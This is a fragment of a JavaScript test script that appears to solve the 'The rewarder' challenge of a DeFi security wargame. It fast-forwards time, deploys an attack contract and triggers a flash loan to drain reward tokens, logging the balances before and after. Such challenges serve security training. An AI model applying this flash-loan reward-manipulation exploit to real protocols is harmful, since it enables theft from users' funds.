...
describe("[Challenge] The rewarder", function () {
  ...
  it("Execution", async function () {
    console.log("Player reward token balance before attack: ", String(await rewardToken.balanceOf(player.address)))

    // Wait for the right time (5 days)
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60])

    // Deploy evil contract
    let rewarderAttack = await (
      await ethers.getContractFactory("RewarderAttack", player)
    ).deploy(flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address)

    await rewarderAttack.connect(player).executeFlashLoan(TOKENS_IN_LENDER_POOL)
    console.log("Player reward token balance after attack: ", String(await rewardToken.balanceOf(player.address)))
  })
